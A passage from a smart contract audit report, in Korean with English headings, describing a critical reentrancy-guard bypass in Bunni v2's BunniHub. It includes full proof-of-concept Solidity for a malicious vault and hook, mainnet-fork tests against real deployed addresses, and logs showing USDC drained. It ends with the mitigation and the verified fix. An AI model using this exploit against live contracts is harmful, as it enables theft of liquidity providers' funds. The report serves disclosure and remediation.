**Lead Auditors**

[Giovanni Di Siena](https://x.com/giovannidisiena)

[Draiakoo](https://x.com/draiakoo)

**Assisting Auditors**

[Pontifex](https://x.com/pontifex73)

---

# Findings
## Critical Risk


### Pools configured with a malicious hook can bypass the `BunniHub` re-entrancy guard to drain all raw balances and vault reserves of legitimate pools

**Description:** `BunniHub`는 각 풀이 예치한 raw 밸런스와 볼트 준비금(vault reserves)을 모두 보유하고 회계 처리하는 주요 계약입니다. `nonReentrant` 수정자를 구현하는 `ReentrancyGuard`를 상속합니다:

```solidity
modifier nonReentrant() {
    _nonReentrantBefore();
    _;
    _nonReentrantAfter();
}

function _nonReentrantBefore() internal {
    uint256 statusSlot = STATUS_SLOT;
    uint256 status;
    /// @solidity memory-safe-assembly
    assembly {
        status := tload(statusSlot)
    }
    if (status == ENTERED) revert ReentrancyGuard__ReentrantCall();

    uint256 entered = ENTERED;
    /// @solidity memory-safe-assembly
    assembly {
        tstore(statusSlot, entered)
    }
}

function _nonReentrantAfter() internal {
    uint256 statusSlot = STATUS_SLOT;
    uint256 notEntered = NOT_ENTERED;
    /// @solidity memory-safe-assembly
    assembly {
        tstore(statusSlot, notEntered)
    }
}
```

Bunni 풀을 리밸런싱하는 동안 이 재진입(re-entrancy) 로직을 전/후 후크로 분리하는 것이 의도되었습니다. 이 함수들은 동일한 전역 재진입 방지 transient storage 슬롯을 재사용하여 악의적인 이행자(fulfiller)에 의한 잠재적인 재진입 실행으로부터 `BunniHub`를 잠급니다:

```solidity
function lockForRebalance(PoolKey calldata key) external notPaused(6) {
    if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__BunniTokenNotInitialized();
    if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
    _nonReentrantBefore();
}

function unlockForRebalance(PoolKey calldata key) external notPaused(7) {
    if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__BunniTokenNotInitialized();
    if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
    _nonReentrantAfter();
}
```

그러나 Bunni 풀의 후크는 표준 `BunniHook` 구현으로 제한되지 않으므로, 누구나 `unlockForRebalance()`를 직접 호출하여 재진입 방지를 해제하는 악의적인 후크를 만들 수 있습니다:

```solidity
function deployBunniToken(HubStorage storage s, Env calldata env, IBunniHub.DeployBunniTokenParams calldata params)
    external
    returns (IBunniToken token, PoolKey memory key)
{
    ...

    // ensure hook params are valid
    if (address(params.hooks) == address(0)) revert BunniHub__HookCannotBeZero();
    if (!params.hooks.isValidParams(params.hookParams)) revert BunniHub__InvalidHookParams();

    ...
}
```

이 동작의 결과로 `nonReentrant` 수정자가 적용된 모든 `BunniHub` 함수에 대해 재진입 보호가 우회됩니다. 이는 호출 후크가 해당 풀에 회계 처리된 자금을 입금하고 인출할 수 있도록 하는 `hookHandleSwap()`에 특히 문제가 됩니다. 요약하자면, 이 함수는 다음과 같습니다:
1. raw 밸런스와 볼트 준비금을 캐시합니다.
2. ERC-6909 입력 토큰을 후크에서 `BunniHub`로 전송합니다.
3. ERC-6909 출력 토큰을 후크로 전송하려고 시도하고 raw 밸런스가 부족한 경우 지정된 볼트에서 준비금을 인출합니다.
4. 해당 볼트에서 자금을 입금하거나 인출하여 `token0`에 대한 `targetRawbalance`에 도달하려고 시도합니다.
5. 해당 볼트에서 자금을 입금하거나 인출하여 `token1`에 대한 `targetRawbalance`에 도달하려고 시도합니다.
6. 캐시된 raw 밸런스와 볼트 준비금을 증가시키거나 감소시키는 대신 **설정(setting)**하여 스토리지 상태를 업데이트합니다.

처음에는 ERC-6909 토큰 전송으로 인해 재진입이 불가능해 보입니다. 그러나 악의적인 볼트를 생성할 수 있는 가능성이 존재하며, 입금 또는 인출 함수를 사용하여 `targetRawBalance`에 도달하려고 시도할 때 실행을 후크로 다시 라우팅하여 함수에 재진입할 수 있습니다. 풀 스토리지 상태가 캐시되고 실행이 끝날 때 업데이트된다는 점을 감안할 때, 후크는 재진입 호출이 있을 때마다 회계 처리된 잔액까지 인출할 수 있습니다. 충분히 큰 재귀 깊이 이후, 스토리지 변수를 캐시된 상태로 설정하여 상태가 업데이트되므로 후크에 회계 처리된 자금 부족으로 인한 언더플로우를 우회하게 됩니다.

이와 매우 유사한 공격 벡터가 `withdraw()` 함수에도 존재합니다. 여기서는 악의적인 풀 주식(shares)의 일부를 재귀적으로 소각하기 위한 재진입 호출이 회계 처리된 후크 잔액보다 더 많이 액세스할 수 있습니다. 이는 중간 실행이 볼트에 대한 각 외부 호출 후에만 업데이트되는 캐시된 풀 상태에 대한 것이기 때문에 다시 가능합니다. `token0`에 해당하는 볼트가 악의적이고 위에 설명된 대로 악의적인 후크를 통해 `BunniHub`를 잠금 해제한 다음, 총 소각 금액이 사용 가능한 잔액을 초과하지 않도록 Bunni 주식 토큰의 더 작은 부분을 인출하려고 시도하면 전체 `token1` 준비금을 탈취할 수 있습니다.

```solidity
    function withdraw(HubStorage storage s, Env calldata env, IBunniHub.WithdrawParams calldata params)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        if (!params.useQueuedWithdrawal && params.shares == 0) revert BunniHub__ZeroInput();

        PoolId poolId = params.poolKey.toId();
@>      PoolState memory state = getPoolState(s, poolId);

        ...

        uint256 currentTotalSupply = state.bunniToken.totalSupply();
        uint256 shares;

        // burn shares
        if (params.useQueuedWithdrawal) {
            ...
        } else {
            shares = params.shares;
            state.bunniToken.burn(msgSender, shares);
        }
        // at this point of execution we know shares <= currentTotalSupply
        // since otherwise the burn() call would've reverted

        // compute token amount to withdraw and the component amounts

        uint256 reserveAmount0 =
            getReservesInUnderlying(state.reserve0.mulDiv(shares, currentTotalSupply), state.vault0);
        uint256 reserveAmount1 =
            getReservesInUnderlying(state.reserve1.mulDiv(shares, currentTotalSupply), state.vault1);

        uint256 rawAmount0 = state.rawBalance0.mulDiv(shares, currentTotalSupply);
        uint256 rawAmount1 = state.rawBalance1.mulDiv(shares, currentTotalSupply);

        amount0 = reserveAmount0 + rawAmount0;
        amount1 = reserveAmount1 + rawAmount1;

        if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
            revert BunniHub__SlippageTooHigh();
        }

        // decrease idle balance proportionally to the amount removed
        {
            (uint256 balance, bool isToken0) = IdleBalanceLibrary.fromIdleBalance(state.idleBalance);
            uint256 newBalance = balance - balance.mulDiv(shares, currentTotalSupply);
            if (newBalance != balance) {
                s.idleBalance[poolId] = newBalance.toIdleBalance(isToken0);
            }
        }

        /// -----------------------------------------------------------------------
        /// External calls
        /// -----------------------------------------------------------------------

        // withdraw reserve tokens
        if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
            // vault used
            // withdraw reserves
@>          uint256 reserveChange = _withdrawVaultReserve(
                reserveAmount0, params.poolKey.currency0, state.vault0, params.recipient, env.weth
            );
            s.reserve0[poolId] = state.reserve0 - reserveChange;
        }
        if (address(state.vault1) != address(0) && reserveAmount1 != 0) {
            // vault used
            // withdraw from reserves
@>          uint256 reserveChange = _withdrawVaultReserve(
                reserveAmount1, params.poolKey.currency1, state.vault1, params.recipient, env.weth
            );
            s.reserve1[poolId] = state.reserve1 - reserveChange;
        }

        // withdraw raw tokens
        env.poolManager.unlock(
            abi.encode(
                BunniHub.UnlockCallbackType.WITHDRAW,
                abi.encode(params.recipient, params.poolKey, rawAmount0, rawAmount1)
            )
        );

        ...
    }
```

이 벡터는 가져온 준비금 토큰이 호출자에게 즉시 전송되므로 훨씬 더 간단합니다:

```solidity
function _withdrawVaultReserve(uint256 amount, Currency currency, ERC4626 vault, address user, WETH weth)
    internal
    returns (uint256 reserveChange)
{
    if (currency.isAddressZero()) {
        // withdraw WETH from vault to address(this)
        reserveChange = vault.withdraw(amount, address(this), address(this));

        // burn WETH for ETH
        weth.withdraw(amount);

        // transfer ETH to user
        user.safeTransferETH(amount);
    } else {
        // normal ERC20
        reserveChange = vault.withdraw(amount, user, address(this));
    }
}
```

약간 덜 영향력이 있지만 여전히 치명적인 대안은 Flood Plain 리밸런스 주문의 악의적인 이행자가 `IFulfiller::sourceConsideration` 호출 중에 재진입하는 것입니다. 이는 공격자가 최고 입찰을 보유하고 있으며 am-AMM 관리자로 설정되어 있다고 가정합니다. 이는 Pashov Group 발견 C-03과 동일하며 위에서 설명한 재진입 방지 재정의로 인해 권장 완화 조치를 구현했음에도 불구하고 여전히 가능합니다.

**Proof of Concept:** 다음 PoC를 실행하려면:
* `test/mocks/ERC4626Mock.sol` 내에 다음 악의적인 볼트 구현을 추가하십시오:

```solidity
interface MaliciousHook {
    function continueAttackFromMaliciousVault() external;
}

contract MaliciousERC4626 is ERC4626 {
    address internal immutable _asset;
    MaliciousHook internal immutable maliciousHook;
    bool internal attackStarted;

    constructor(IERC20 asset_, address _maliciousHook) {
        _asset = address(asset_);
        maliciousHook = MaliciousHook(_maliciousHook);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }

    function setupAttack() external {
        attackStarted = true;
    }

    function previewRedeem(uint256 shares) public view override returns (uint256 assets) {
        return type(uint128).max;
    }

    function withdraw(uint256 assets, address to, address owner) public override returns(uint256 shares){
        if(attackStarted) {
            maliciousHook.continueAttackFromMaliciousVault();
        } else {
            return super.withdraw(assets, to, owner);
        }
    }

    function deposit(uint256 assets, address to) public override returns(uint256 shares){
        if(attackStarted) {
            maliciousHook.continueAttackFromMaliciousVault();
        } else {
            return super.deposit(assets, to);
        }
    }
}
```

이 볼트 구현은 인출 및 입금 함수 중에 실행을 악의적인 후크로 전달하도록 전환할 수 있는 일반 ERC-4626일 뿐입니다. 이는 `BunniHub`가 `targetRawBalance`에 도달하기 위해 사용하는 메서드들입니다.

* `test/BaseTest.sol` 내에서 다음 import를 변경하십시오:

```diff
--	import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++	import {ERC4626Mock, MaliciousERC4626} from "./mocks/ERC4626Mock.sol";
```

* `test/BunniHub.t.sol` 내에서 `BunniHubTest` 계약 외부에 다음 악의적인 후크 계약을 붙여넣으십시오:

```solidity
import {IAmAmm} from "biddog/interfaces/IAmAmm.sol";

enum Vector {
    HOOK_HANDLE_SWAP,
    WITHDRAW
}

contract CustomHook {
    uint256 public reentrancyIterations;
    uint256 public iterationsCounter;
    IBunniHub public hub;
    PoolKey public key;
    address public vault;
    Vector public vec;
    uint256 public amountOfReservesToWithdraw;
    uint256 public sharesToWithdraw;
    IPoolManager public poolManager;
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    function isValidParams(bytes calldata hookParams) external pure returns (bool) {
        return true;
    }

    function slot0s(PoolId id)
        external
        view
        returns (uint160 sqrtPriceX96, int24 tick, uint32 lastSwapTimestamp, uint32 lastSurgeTimestamp)
    {
        int24 minTick = TickMath.MIN_TICK;
        (sqrtPriceX96, tick, lastSwapTimestamp, lastSurgeTimestamp) = (TickMath.getSqrtPriceAtTick(tick), tick, 0, 0);
    }

    function getTopBidWrite(PoolId id) external view returns (IAmAmm.Bid memory topBid) {
        topBid = IAmAmm.Bid({manager: address(0), blockIdx: 0, payload: 0, rent: 0, deposit: 0});
    }

    function getAmAmmEnabled(PoolId id) external view returns (bool) {
        return false;
    }

    function canWithdraw(PoolId id) external view returns (bool) {
        return true;
    }

    function afterInitialize(address caller, PoolKey calldata key, uint160 sqrtPriceX96, int24 tick)
        external
        returns (bytes4)
    {
        return BunniHook.afterInitialize.selector;
    }

    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
        external
        returns (bytes4, int256, uint24)
    {
        return (BunniHook.beforeSwap.selector, 0, 0);
    }

    function depositInitialReserves(
        address token,
        uint256 amount,
        address _hub,
        IPoolManager _poolManager,
        PoolKey memory _key,
        bool zeroForOne
    ) external {
        key = _key;
        hub = IBunniHub(_hub);
        poolManager = _poolManager;
        poolManager.setOperator(_hub, true);
        poolManager.unlock(abi.encode(uint8(0), token, amount, msg.sender, zeroForOne));
        poolManager.unlock(abi.encode(uint8(1), address(0), amount, msg.sender, zeroForOne));
    }

    function mintERC6909(address token, uint256 amount) external {
        poolManager.unlock(abi.encode(uint8(0), token, amount, msg.sender, true));
    }

    function mintBunniToken(PoolKey memory _key, uint256 _amount0, uint256 _amount1)
        external
        returns (uint256 shares)
    {
        IERC20(Currency.unwrap(_key.currency0)).transferFrom(msg.sender, address(this), _amount0);
        IERC20(Currency.unwrap(_key.currency1)).transferFrom(msg.sender, address(this), _amount1);

        IERC20(Currency.unwrap(_key.currency0)).approve(address(PERMIT2), _amount0);
        IERC20(Currency.unwrap(_key.currency1)).approve(address(PERMIT2), _amount1);
        PERMIT2.approve(Currency.unwrap(_key.currency0), address(hub), uint160(_amount0), type(uint48).max);
        PERMIT2.approve(Currency.unwrap(_key.currency1), address(hub), uint160(_amount1), type(uint48).max);

        (shares,,) = IBunniHub(hub).deposit(
            IBunniHub.DepositParams({
                poolKey: _key,
                amount0Desired: _amount0,
                amount1Desired: _amount1,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                recipient: address(this),
                refundRecipient: address(this),
                vaultFee0: 0,
                vaultFee1: 0,
                referrer: address(0)
            })
        );
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory result) {
        (uint8 mode, address token, uint256 amount, address spender, bool zeroForOne) =
            abi.decode(data, (uint8, address, uint256, address, bool));
        if (mode == 0) {
            poolManager.sync(Currency.wrap(token));
            IERC20(token).transferFrom(spender, address(poolManager), amount);
            uint256 deltaAmount = poolManager.settle();
            poolManager.mint(address(this), Currency.wrap(token).toId(), deltaAmount);
        } else if (mode == 1) {
            hub.hookHandleSwap(key, zeroForOne, amount, 0);
        } else if (mode == 2) {
            hub.hookHandleSwap(key, false, 1, amountOfReservesToWithdraw);
        }
    }

    function initiateAttack(
        IBunniHub _hub,
        PoolKey memory _key,
        address _targetVault,
        uint256 _amountToWithdraw,
        Vector _vec,
        uint256 iterations
    ) public {
        reentrancyIterations = iterations;
        hub = _hub;
        key = _key;
        vault = _targetVault;
        vec = _vec;
        if (vec == Vector.HOOK_HANDLE_SWAP) {
            amountOfReservesToWithdraw = _amountToWithdraw;
            poolManager.unlock(abi.encode(uint8(2), address(0), amountOfReservesToWithdraw, msg.sender, true));
        } else if (vec == Vector.WITHDRAW) {
            sharesToWithdraw = _amountToWithdraw;
            hub.withdraw(
                IBunniHub.WithdrawParams({
                    poolKey: _key,
                    recipient: address(this),
                    shares: sharesToWithdraw,
                    amount0Min: 0,
                    amount1Min: 0,
                    deadline: block.timestamp,
                    useQueuedWithdrawal: false
                })
            );
        }
    }

    function continueAttackFromMaliciousVault() public {
        if (iterationsCounter != reentrancyIterations) {
            iterationsCounter++;
            disableReentrancyGuard();

            if (vec == Vector.HOOK_HANDLE_SWAP) {
                hub.hookHandleSwap(
                    key, false, 1, /* amountToDeposit to trigger the updateIfNeeded */ amountOfReservesToWithdraw
                );
            } else if (vec == Vector.WITHDRAW) {
                sharesToWithdraw /= 2;

                hub.withdraw(
                    IBunniHub.WithdrawParams({
                        poolKey: key,
                        recipient: address(this),
                        shares: sharesToWithdraw,
                        amount0Min: 0,
                        amount1Min: 0,
                        deadline: block.timestamp,
                        useQueuedWithdrawal: false
                    })
                );
            }
        }
    }

    function disableReentrancyGuard() public {
        hub.unlockForRebalance(key);
    }

    fallback() external payable {}
}
```

* 위의 모든 내용을 바탕으로 `test/BunniHub.t.sol` 내부에서 이 테스트를 실행할 수 있습니다:

```solidity
function test_ForkHookHandleSwapDrainRawBalancePoC() public {
    uint256 mainnetFork;
    string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    mainnetFork = vm.createFork(MAINNET_RPC_URL);
    vm.selectFork(mainnetFork);
    vm.rollFork(22347121);

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDCVault = 0x3b028b4b6c567eF5f8Ca1144Da4FbaA0D973F228; // Euler vault

    IERC20 token0 = IERC20(USDC);
    IERC20 token1 = IERC20(WETH);
    poolManager = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    hub = IBunniHub(0x000000DCeb71f3107909b1b748424349bfde5493);
    bunniHook = BunniHook(payable(0x0010d0D5dB05933Fa0D9F7038D365E1541a41888));

    // 1. Create the malicious pool linked to the malicious hook
    bytes32 salt;
    unchecked {
        bytes memory creationCode = abi.encodePacked(type(CustomHook).creationCode);
        uint256 offset;
        while (true) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (uint160(bytes20(deployed)) & Hooks.ALL_HOOK_MASK == HOOK_FLAGS && deployed.code.length == 0) {
                break;
            }
            offset++;
        }
    }
    address customHook = address(new CustomHook{salt: salt}());

    // 2. Create the malicious vault
    MaliciousERC4626 maliciousVault = new MaliciousERC4626(token1, customHook);
    token1.approve(address(maliciousVault), type(uint256).max);
    deal(address(token1), address(maliciousVault), 1 ether);

    // 3. Register the malicious pool to steal reserve balances
    (, PoolKey memory maliciousKey) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: new MockLDF(address(hub), address(customHook), address(quoter)),
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.STATIC,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            hooks: BunniHook(payable(customHook)),
            hookParams: "",
            vault0: ERC4626(address(USDCVault)),
            vault1: ERC4626(address(maliciousVault)),
            minRawTokenRatio0: 1e6,         // set to 100% to have all funds in raw balance
            targetRawTokenRatio0: 1e6,      // set to 100% to have all funds in raw balance
            maxRawTokenRatio0: 1e6,         // set to 100% to have all funds in raw balance
            minRawTokenRatio1: 0,           // set to 0% to trigger a deposit upon transferring 1 token
            targetRawTokenRatio1: 0,        // set to 0% to trigger a deposit upon transferring 1 token
            maxRawTokenRatio1: 0,           // set to 0% to trigger a deposit upon transferring 1 token
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("MaliciousBunniToken"),
            symbol: bytes32("BAD-BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(keccak256("malicious"))
        })
    );

    // 4. Make a deposit to the malicious pool to have accounted some reserves of vault0 and initiate attack
    uint256 initialToken0Deposit = 10_000e6; // Using a big amount in order to not execute too many reentrancy iterations, but it works with whatever amount
    deal(address(token0), address(this), initialToken0Deposit);
    deal(address(token1), address(this), initialToken0Deposit);
    token0.approve(customHook, initialToken0Deposit);
    token1.approve(customHook, initialToken0Deposit);
    CustomHook(payable(customHook)).depositInitialReserves(
        address(token0), initialToken0Deposit, address(hub), poolManager, maliciousKey, true
    );
    CustomHook(payable(customHook)).mintERC6909(address(token1), initialToken0Deposit);

    console.log(
        "BunniHub token0 raw balance before",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token0)).toId())
    );
    console.log("BunniHub token0 vault reserve before", ERC4626(USDCVault).balanceOf(address(hub)));
    console.log(
        "MaliciousHook token0 balance before",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId())
    );
    maliciousVault.setupAttack();
    CustomHook(payable(customHook)).initiateAttack(
        IBunniHub(address(hub)),
        maliciousKey,
        USDCVault,
        initialToken0Deposit,
        Vector.HOOK_HANDLE_SWAP,
        20
    );
    console.log(
        "BunniHub token0 raw balance after",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token0)).toId())
    );
    console.log("BunniHub token0 vault reserve after", ERC4626(USDCVault).balanceOf(address(hub)));
    console.log(
        "MaliciousHook token0 balance after",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId())
    );
    console.log(
        "Stolen USDC",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId()) - initialToken0Deposit
    );
}
```

실행은 다음을 수행합니다:
1. `IBunniHub`에 일부 raw 밸런스를 입금하고 회계 처리하는 악의적인 후크에서 `depositInitialReserves()`를 호출합니다.
2. `BunniHub` 내부의 `hookHandleSwap()` 함수를 호출하여 이전에 예치된 금액을 인출합니다.
3. `BunniHub`는 토큰을 후크로 전송합니다.
4. `hookHandleSwap()`은 token1의 `targetRawBalance`에 도달하려고 시도하고 악의적인 볼트로 `deposit()`을 호출하여 실행을 다시 악의적인 후크로 전달합니다.
5. 악의적인 후크는 `unlockForRebalance()` 함수를 호출하여 재진입 보호를 비활성화합니다.
6. 악의적인 후크는 2단계와 동일한 방식으로 `hookHandleSwap()` 함수에 다시 들어갑니다.

모든 raw 밸런스를 탈취할 수 있을 만큼 충분한 횟수만큼 함수에 다시 진입하면 상태는 감소(decrementing)하는 대신 0으로 설정되어 언더플로우를 방지합니다. 최종 결과는 악의적인 후크가 이전에 `BunniHub`가 보유한 모든 ERC-6909 토큰을 소유하게 되는 것입니다.

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_ForkHookHandleSwapDrainRawBalancePoC() (gas: 20540027)
Logs:
  BunniHub token0 raw balance before 219036268296
  BunniHub token0 vault reserve before 388807745471
  MaliciousHook token0 balance before 0
  BunniHub token0 raw balance after 9036268296
  BunniHub token0 vault reserve after 388807745471
  MaliciousHook token0 balance after 210000000000
  Stolen USDC 200000000000
```

다음과 같이 악의적인 후크의 토큰 비율 경계(token ratio bounds)를 수정하여 `BunniHub`가 보유한 모든 볼트 준비금을 탈취하는 것도 가능합니다:

```solidity
minRawTokenRatio0: 0,           // set to 0% in order to have all deposited funds accounted into the vault
targetRawTokenRatio0: 0,        // set to 0% in order to have all deposited funds accounted into the vault
maxRawTokenRatio0: 0,           // set to 0% in order to have all deposited funds accounted into the vault
```

이 수정으로 탈취할 볼트의 목표 raw 밸런스가 0%로 설정되어 모든 유동성이 볼트에 회계 처리됩니다. 이러한 방식으로 `BunniHub`가 자금을 후크로 전송하려고 시도할 때 볼트에서 자금을 인출해야 하므로 다른 풀에서 볼트 주식을 반복적으로 소각하는 데 악용될 수 있습니다.

공격 설정도 최적의 반복 횟수를 계산하도록 약간 수정해야 합니다:

```solidity
uint256 sharesToMint = ERC4626(USDCVault).previewDeposit(initialToken0Deposit) - 1e6;
CustomHook(payable(customHook)).initiateAttack(
    IBunniHub(address(hub)),
    maliciousKey,
    USDCVault,
    sharesToMint,
    Vector.HOOK_HANDLE_SWAP,
    ERC4626(USDCVault).balanceOf(address(hub)) / sharesToMint
);

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_ForkHookHandleSwapDrainReserveBalancePoC() (gas: 23881409)
Logs:
  BunniHub token0 raw balance before 209036268296
  BunniHub token0 vault reserve before 398583692087
  MaliciousHook token0 balance before 0
  BunniHub token0 raw balance after 209036268296
  BunniHub token0 vault reserve after 6790331257
  MaliciousHook token0 balance after 400772811256
  Stolen USDC 390772811256
```

아래 PoC에 표시된 대로 악의적인 Bunni 토큰 주식(shares)의 인출을 통해서도 유사한 공격을 실행할 수 있습니다:

```solidity
function test_ForkWithdrawPoC() public {
    uint256 mainnetFork;
    string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    mainnetFork = vm.createFork(MAINNET_RPC_URL);
    vm.selectFork(mainnetFork);
    vm.rollFork(22347121);

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDCVault = 0x3b028b4b6c567eF5f8Ca1144Da4FbaA0D973F228; // Euler vault

    IERC20 token0 = IERC20(WETH);
    IERC20 token1 = IERC20(USDC);

    while (address(token0) > address(token1)) {
        token0 = IERC20(address(new ERC20Mock()));
    }

    poolManager = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    hub = IBunniHub(0x000000DCeb71f3107909b1b748424349bfde5493);
    bunniHook = BunniHook(payable(0x0010d0D5dB05933Fa0D9F7038D365E1541a41888));

    // 1. Create the malicious pool linked to the malicious hook
    bytes32 salt;
    unchecked {
        bytes memory creationCode = abi.encodePacked(type(CustomHook).creationCode);
        uint256 offset;
        while (true) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (uint160(bytes20(deployed)) & Hooks.ALL_HOOK_MASK == HOOK_FLAGS && deployed.code.length == 0) {
                break;
            }
            offset++;
        }
    }
    address customHook = address(new CustomHook{salt: salt}());

    // 2. Create the malicious vault
    MaliciousERC4626 maliciousVault = new MaliciousERC4626(token0, customHook);
    token1.approve(address(maliciousVault), type(uint256).max);
    deal(address(token1), address(maliciousVault), 1 ether);

    // 3. Register the malicious pool
    (, PoolKey memory maliciousKey) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: new MockLDF(address(hub), address(customHook), address(quoter)),
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.STATIC,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            hooks: BunniHook(payable(customHook)),
            hookParams: "",
            vault0: ERC4626(address(maliciousVault)),
            vault1: ERC4626(address(USDCVault)),
            minRawTokenRatio0: 0,
            targetRawTokenRatio0: 0,
            maxRawTokenRatio0: 0,
            minRawTokenRatio1: 0,
            targetRawTokenRatio1: 0,
            maxRawTokenRatio1: 0,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("MaliciousBunniToken"),
            symbol: bytes32("BAD-BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(keccak256("malicious"))
        })
    );

    // 4. Make a deposit to the malicious pool to have accounted some reserves of vault0 and initiate attack
    uint256 initialToken0Deposit = 50_000 ether;
    uint256 initialToken1Deposit = 50_000e6;
    deal(address(token0), address(this), 2 * initialToken0Deposit);
    deal(address(token1), address(this), 2 * initialToken0Deposit);
    token0.approve(customHook, 2 * initialToken0Deposit);
    token1.approve(customHook, 2 * initialToken0Deposit);
    CustomHook(payable(customHook)).depositInitialReserves(
        address(token1), initialToken1Deposit, address(hub), poolManager, maliciousKey, false
    );
    CustomHook(payable(customHook)).mintERC6909(address(token0), initialToken0Deposit);
    uint256 shares =
        CustomHook(payable(customHook)).mintBunniToken(maliciousKey, initialToken0Deposit, initialToken1Deposit);

    console.log(
        "BunniHub token1 raw balance before",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token1)).toId())
    );
    console.log("BunniHub token1 vault reserve before", ERC4626(USDCVault).maxWithdraw(address(hub)));
    uint256 hookBalanceBefore = token1.balanceOf(customHook);
    console.log("MaliciousHook token1 balance before", hookBalanceBefore);

    maliciousVault.setupAttack();
    CustomHook(payable(customHook)).initiateAttack(
        IBunniHub(address(hub)), maliciousKey, USDCVault, shares / 2, Vector.WITHDRAW, 17
    );
    console.log(
        "BunniHub token1 raw balance after",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token1)).toId())
    );
    console.log("BunniHub token1 vault reserve after", ERC4626(USDCVault).maxWithdraw(address(hub)));
    console.log("MaliciousHook token1 balance after", token1.balanceOf(customHook));
    console.log("USDC stolen", token1.balanceOf(customHook) - initialToken1Deposit);
}
```

Logs:
```bash
[PASS] test_ForkWithdrawPoC() (gas: 23086872)
Logs:
  BunniHub token1 raw balance before 209036268296
  BunniHub token1 vault reserve before 447718769054
  MaliciousHook token1 balance before 50000000000
  BunniHub token1 raw balance after 209036268296
  BunniHub token1 vault reserve after 3757038234
  MaliciousHook token1 balance after 493961730811
  USDC stolen 443961730811
```

**Impact:** 합법적인 풀의 모든 raw 밸런스와 볼트 준비금은 `BunniHub` 재진입 방지를 우회하는 사용자 지정 후크로 구성된 완전히 격리되고 악의적인 풀에 의해 완전히 인출될 수 있습니다. 이 감사 및 관련 공개 당시, 이 자금은 733만 달러의 가치가 있었습니다.

**Recommended Mitigation:** 공격의 근본 원인은 `unlockForRebalance()`를 호출하여 의도된 글로벌 재진입 보호를 비활성화할 수 있는 능력이었으며, 이 기능은 이후 비활성화되었습니다. 한 가지 해결책은 한 풀이 다른 풀의 재진입 방지 transient storage 상태를 조작할 수 없도록 풀별로 재밸런싱 재진입 보호를 구현하는 것입니다. 또한 Bunni 풀이 임의의 후크 구현으로 배포되도록 허용하면 공격 표면이 크게 증가합니다. 대신 후크를 표준 `BunniHook` 구현으로 제한하여 이러한 `BunniHub` 함수를 직접 호출할 수 없도록 하여 이를 최소화하는 것이 좋습니다.

**Bacon Labs:** [PR \#95](https://github.com/timeless-fi/bunni-v2/pull/95)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `BunniHub::unlockForRebalance`는 재진입 공격을 방지하기 위해 제거되었으며 `BunniHub::hookGive`가 `_rebalancePosthookCallback()` 내의 `hookHandleSwap()` 호출 대신 추가되었습니다. 그러나 볼트 준비금을 업데이트하기 위한 `_updateRawBalanceIfNeeded()` 호출이 없다는 점이 지적되었습니다. 후크 허용 목록(whitelist)도 `BunniHub`에 추가되었습니다.

**Bacon Labs:** `BunniHub::hookGive`는 의도적으로 단순하게 유지되며 볼트와 같은 잠재적으로 악의적인 계약 호출을 피합니다.

